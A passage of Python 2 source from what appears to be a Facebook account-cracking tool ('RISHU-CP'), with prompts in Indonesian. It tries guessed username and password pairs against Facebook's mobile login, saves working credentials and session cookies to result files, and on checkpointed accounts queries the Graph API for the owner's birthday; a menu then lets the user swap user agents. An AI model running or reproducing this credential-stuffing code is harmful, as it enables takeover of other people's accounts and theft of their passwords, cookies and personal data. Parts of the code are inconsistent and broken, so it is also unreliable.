                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[RISHU-CP] %s|%s|%s ' % (H,user,pw,kuki)
                sv = ' [RISHU-CP] %s|%s|%s' % (user,pw,kuki)
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[RISHU-CP] %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                    sv = ' [RISHU-CP] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r %s[RISHU-CP] %s|%s              ' % (K,user,pw)
                sv = ' [RISHU-CP] %s|%s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1
        
# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agents "%(P,K,P))
	print (" [%s02%s] Cek user agents "%(K,P))
	print (" [%s00%s] Kembali "%(M,P))
	uas()
	
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(P,K))
    if u == '':
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m [!] Error ") 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar kentod "%(M));jeda(2);uas()
 
        
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
